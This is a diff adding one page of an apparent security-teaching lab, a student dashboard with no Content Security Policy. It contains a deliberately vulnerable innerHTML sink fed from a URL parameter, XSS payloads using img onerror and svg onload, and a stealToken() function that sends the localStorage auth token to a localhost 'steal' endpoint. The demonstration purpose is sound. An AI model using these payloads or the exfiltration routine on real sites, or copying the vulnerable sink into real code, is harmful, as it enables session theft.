@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Version 1 — No CSP (Fully Vulnerable)</title>
+
+  <!-- ══════════════════════════════════════════════════
+       VERSION 1: NO CONTENT SECURITY POLICY
+       
+       No CSP header is present.
+       All inline scripts, event handlers, and external
+       resources are fully permitted by the browser.
+       DOM-XSS payloads execute without any restriction.
+  ══════════════════════════════════════════════════ -->
+
+  <link rel="stylesheet" href="shared.css">
+  <style>
+    .banner-v1 .eb-tag { background: rgba(255,77,109,0.15); }
+    .vuln-section { border: 1px solid rgba(255,77,109,0.35); }
+    .vuln-header { background: rgba(255,77,109,0.08); border-bottom: 1px solid rgba(255,77,109,0.2); }
+    .vuln-header h3 { color: var(--accent2); }
+    .render-zone { border-color: rgba(255,77,109,0.4); }
+    .render-zone-label { color: var(--accent2); }
+    .url-field input:focus { border-color: var(--accent2); }
+    .inject-btn { background: var(--accent2); }
+    .inject-btn:hover { background: #ff2d52; }
+    .payload-item:hover { border-color: var(--accent2); }
+    .payload-item .pi-tag { color: var(--accent2); }
+  </style>
+</head>
+<body>
+
+<!-- Experiment Banner -->
+<div class="exp-banner banner-v1">
+  <div class="eb-left">
+    <span class="eb-tag">Version 1 / 4</span>
+    <span class="eb-title">❌ No CSP</span>
+    <span class="eb-desc">No Content-Security-Policy header — all XSS payloads execute freely</span>
+  </div>
+  <a href="index.html" style="color:var(--accent2)">← Back to Hub</a>
+</div>
+
+<!-- XSS Alert Banner -->
+<div class="alert-banner" id="alertBanner">
+  <button class="ab-close" onclick="document.getElementById('alertBanner').style.display='none'">×</button>
+  <div class="ab-title">🚨 XSS SUCCESS — Token Exfiltrated!</div>
+  <div class="ab-body" id="alertBody"></div>
+</div>
+
+<!-- Sidebar -->
+<nav class="sidebar">
+  <div class="sidebar-brand">
+    <div class="icon">🎓</div>
+    <div class="name">Academia<span>Secure</span></div>
+  </div>
+  <div class="nav-section">Navigation</div>
+  <a class="nav-item active" href="#"><span class="ni">🏠</span> Dashboard</a>
+  <a class="nav-item" href="#vuln"><span class="ni">💉</span> XSS Demo</a>
+  <a class="nav-item" href="#console"><span class="ni">📋</span> Console Log</a>
+
+  <div class="version-links">
+    <div class="vl-title">Experiment Versions</div>
+    <a class="vl-item current" href="dashboard-v1-no-csp.html">
+      <div class="vl-dot" style="background:var(--accent2)"></div> V1 — No CSP
+    </a>
+    <a class="vl-item" href="dashboard-v2-weak-csp.html">
+      <div class="vl-dot" style="background:var(--warn)"></div> V2 — Weak CSP
+    </a>
+    <a class="vl-item" href="dashboard-v3-strict-csp.html">
+      <div class="vl-dot" style="background:var(--accent3)"></div> V3 — Strict CSP
+    </a>
+    <a class="vl-item" href="dashboard-v4-secure.html">
+      <div class="vl-dot" style="background:var(--accent)"></div> V4 — Secure Code
+    </a>
+  </div>
+</nav>
+
+<div class="main">
+  <div class="topbar">
+    <div class="topbar-left">
+      <div class="page-title">Student Dashboard</div>
+      <div class="breadcrumb">experiment / v1 / no-csp</div>
+    </div>
+    <div class="topbar-right">
+      <div class="user-pill">
+        <div class="avatar" id="avatarLetter">S</div>
+        <span class="uname" id="displayUser">student</span>
+      </div>
+      <button class="logout-btn" onclick="logout()">Logout →</button>
+    </div>
+  </div>
+
+  <div class="content">
+
+    <!-- Stats -->
+    <div class="stats-row">
+      <div class="stat-card">
+        <div class="label">GPA</div>
+        <div class="value" style="color:var(--accent)">3.85</div>
+        <div class="sub">↑ This semester</div>
+        <div class="corner">📈</div>
+      </div>
+      <div class="stat-card">
+        <div class="label">Courses</div>
+        <div class="value">6</div>
+        <div class="sub">Enrolled this term</div>
+        <div class="corner">📚</div>
+      </div>
+      <div class="stat-card">
+        <div class="label">CSP Status</div>
+        <div class="value" style="font-size:15px;color:var(--accent2);font-family:var(--mono);margin-top:6px">NONE</div>
+        <div class="sub" style="color:var(--accent2)">No policy active</div>
+        <div class="corner">🚫</div>
+      </div>
+      <div class="stat-card">
+        <div class="label">XSS Risk</div>
+        <div class="value" style="font-size:15px;color:var(--accent2);font-family:var(--mono);margin-top:6px">CRITICAL</div>
+        <div class="sub" style="color:var(--accent2)">Fully exploitable</div>
+        <div class="corner">💀</div>
+      </div>
+    </div>
+
+    <!-- Grades + Token -->
+    <div class="main-grid">
+      <div class="panel">
+        <div class="panel-header">
+          <h3>📊 Grades</h3>
+          <span class="ph-badge badge-ok">Sensitive Data</span>
+        </div>
+        <div class="panel-body">
+          <table>
+            <thead><tr><th>Course</th><th>Code</th><th>Grade</th></tr></thead>
+            <tbody>
+              <tr><td>Web Security</td><td style="font-family:var(--mono);font-size:12px;color:var(--muted)">CS-481</td><td><span class="grade-pill gA">A</span></td></tr>
+              <tr><td>Cryptography</td><td style="font-family:var(--mono);font-size:12px;color:var(--muted)">CS-460</td><td><span class="grade-pill gA">A-</span></td></tr>
+              <tr><td>Network Security</td><td style="font-family:var(--mono);font-size:12px;color:var(--muted)">CS-450</td><td><span class="grade-pill gB">B+</span></td></tr>
+              <tr><td>Software Eng.</td><td style="font-family:var(--mono);font-size:12px;color:var(--muted)">CS-390</td><td><span class="grade-pill gA">A</span></td></tr>
+              <tr><td>OS</td><td style="font-family:var(--mono);font-size:12px;color:var(--muted)">CS-340</td><td><span class="grade-pill gB">B</span></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="panel-header">
+          <h3>🔑 Session Token</h3>
+          <span class="ph-badge badge-danger">Exposed in localStorage</span>
+        </div>
+        <div class="panel-body">
+          <div class="token-box">
+            <div class="tb-label">⚠ auth_token — accessible to any JS on this page</div>
+            <div class="token-display" id="tokenDisplay">Loading...</div>
+          </div>
+          <p style="font-family:var(--mono);font-size:11px;color:var(--muted);margin-top:12px;line-height:1.7">
+            With no CSP, any injected script can call <code style="color:var(--warn)">localStorage.getItem('auth_token')</code> and send it to an attacker server.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- ═══ VULNERABILITY DEMO ═══ -->
+    <div class="vuln-section" id="vuln">
+      <div class="vuln-header">
+        <span style="font-size:20px">💉</span>
+        <div>
+          <h3>DOM-XSS Exploit — ACTIVE (No Protection)</h3>
+          <p>Sink: <code>innerHTML</code> · Source: <code>?report=</code> URL parameter · CSP: None</p>
+        </div>
+        <span class="ph-badge badge-danger" style="margin-left:auto">VULNERABLE</span>
+      </div>
+      <div class="vuln-body">
+
+        <div class="result-box" style="background:rgba(255,77,109,0.06);border-color:rgba(255,77,109,0.25);color:var(--accent2)">
+          <div class="rb-title">🔴 Expected Behavior — Version 1</div>
+          All payloads execute. No browser restriction. Inline event handlers fire freely. Token theft succeeds.
+        </div>
+
+        <div class="url-label" style="margin-top:16px">Inject payload via URL parameter simulation:</div>
+        <div class="url-field">
+          <input type="text" id="reportInput" placeholder="e.g. <img src=x onerror=alert('XSS V1')>"/>
+          <button class="inject-btn" onclick="simulateInject()">Inject →</button>
+        </div>
+
+        <div class="url-label">📍 innerHTML Render Zone — <span style="color:var(--accent2)">unsanitized output</span>:</div>
+        <div class="render-zone" id="renderZone">
+          <span class="render-zone-label">innerHTML sink</span>
+          <span style="color:var(--muted);font-family:var(--mono);font-size:12px">Awaiting payload...</span>
+        </div>
+
+        <div class="url-label">📦 Pre-built Attack Payloads:</div>
+        <div class="payload-grid">
+          <div class="payload-item" onclick="loadPayload('<b style=\'color:#ff4d6d\'>HTML Injected — DOM Modified</b>')">
+            <div class="pi-tag">1. HTML Injection</div>
+            <div class="pi-code">&lt;b style='color:red'&gt;HTML Injected&lt;/b&gt;</div>
+          </div>
+          <div class="payload-item" onclick="loadPayload('<img src=x onerror=alert(\'XSS: Script Executed on V1!\')>')">
+            <div class="pi-tag">2. alert() — Classic XSS</div>
+            <div class="pi-code">&lt;img src=x onerror=alert('XSS!')&gt;</div>
+          </div>
+          <div class="payload-item" onclick="loadPayload('<img src=x onerror=stealToken()>')">
+            <div class="pi-tag">3. Token Theft 🔴 Real Impact</div>
+            <div class="pi-code">&lt;img src=x onerror=stealToken()&gt;</div>
+          </div>
+          <div class="payload-item" onclick="loadPayload('<svg onload=alert(\'SVG onload payload — V1\')></svg>')">
+            <div class="pi-tag">4. SVG onload</div>
+            <div class="pi-code">&lt;svg onload=alert('XSS')&gt;&lt;/svg&gt;</div>
+          </div>
+        </div>
+
+        <div class="code-snippet">
+          <div class="cs-header">
+            <span class="lang">JavaScript — Vulnerable Sink</span>
+            <span>dashboard-v1-no-csp.html</span>
+          </div>
+          <pre><span class="cm">// SOURCE: attacker-controlled URL parameter</span>
+<span class="kw">const</span> params = <span class="kw">new</span> URLSearchParams(window.location.search);
+<span class="kw">const</span> report = params.get(<span class="str">'report'</span>);
+
+<span class="cm">// SINK: innerHTML — renders raw HTML+JS, NO sanitization</span>
+document.getElementById(<span class="str">'renderZone'</span>).<span class="hi-red">innerHTML</span> = report; <span class="cm">// ← VULNERABLE
+
+// No CSP = browser applies zero restrictions
+// Event handlers (onerror, onload) execute immediately</span></pre>
+        </div>
+      </div>
+    </div>
+
+   
+    </div>
+
+  </div>
+</div>
+
+<script>
+  /* ── Auth Guard ── */
+  const token = localStorage.getItem('auth_token');
+  if (!token) window.location.href = 'login.html';
+  const authUser = localStorage.getItem('auth_user') || 'student';
+
+  document.getElementById('displayUser').textContent = authUser;
+  document.getElementById('avatarLetter').textContent = authUser.charAt(0).toUpperCase();
+  document.getElementById('tokenDisplay').innerHTML =
+    '<b style="color:var(--warn)">' + token.substring(0,35) + '...</b><br><span style="opacity:0.5">' + token.substring(35,70) + '...</span>';
+
+  /* ── Console Log ── */
+  const logs = [];
+  function addLog(msg, type='info') {
+    logs.unshift({ ts: new Date().toLocaleTimeString(), msg, type });
+    document.getElementById('logContainer').innerHTML = logs.map(l =>
+      `<div class="log-line"><span class="ll-ts">${l.ts}</span><span class="ll-${l.type}">${l.msg}</span></div>`
+    ).join('');
+  }
+
+  addLog('Page loaded — No CSP active', 'warn');
+  addLog('auth_token found in localStorage', 'warn');
+  addLog('All script sources permitted — no restrictions', 'warn');
+
+  /* ── DOM-XSS from URL ── */
+  const params = new URLSearchParams(window.location.search);
+  const urlReport = params.get('report');
+  if (urlReport) {
+    // ⚠ VULNERABLE: direct innerHTML assignment
+    document.getElementById('renderZone').innerHTML = urlReport;
+    document.getElementById('reportInput').value = urlReport;
+    addLog('URL ?report= injected into innerHTML — VULNERABLE', 'err');
+  }
+
+  /* ── Manual Inject ── */
+  function simulateInject() {
+    const payload = document.getElementById('reportInput').value;
+    if (!payload) { addLog('No payload entered', 'warn'); return; }
+    // ⚠ VULNERABLE SINK
+    document.getElementById('renderZone').innerHTML = payload;
+    history.pushState({}, '', '?report=' + encodeURIComponent(payload));
+    addLog('Payload injected via innerHTML: ' + payload.substring(0,60), 'err');
+  }
+
+  function loadPayload(p) {
+    document.getElementById('reportInput').value = p;
+    addLog('Payload loaded: ' + p.substring(0,50), 'warn');
+  }
+
+  /* ── Token Theft Simulation ── */
+  function stealToken() {
+  // 🔒 Prevent infinite execution
+  if (window.__tokenAlreadyStolen) return;
+  window.__tokenAlreadyStolen = true;
+  const stolen = localStorage.getItem('auth_token');
+  const user = localStorage.getItem('auth_user') || 'student';
+  const exfilUrl =
+    "http://localhost:9000/steal" +
+    "?user=" + encodeURIComponent(user) +
+    "&token=" + encodeURIComponent(stolen);
+  const img = new Image();
+  img.src = exfilUrl;
+  // Keep popup
+  document.getElementById('alertBody').innerHTML =
+    '<span style="color:#ff8fa3">✓ User:</span> ' + user + '<br>' +
+    '<span style="color:#ff8fa3">✓ Token (partial):</span> <span style="color:var(--warn)">' +
+      stolen.substring(0,80) + '...</span><br><br>' +
+    '<span style="color:#5a5d72">Sent to → </span>' +
+    '<span style="color:var(--accent)">' + exfilUrl.substring(0,80) + '...</span>';
+  document.getElementById('alertBanner').style.display = 'block';
+  addLog('🚨 TOKEN STOLEN (once) — sent to attacker server!', 'err');
+}
+  function logout() {
+    localStorage.clear();
+    window.location.href = 'login.html';
+  }
+</script>
+</body>
+</html>
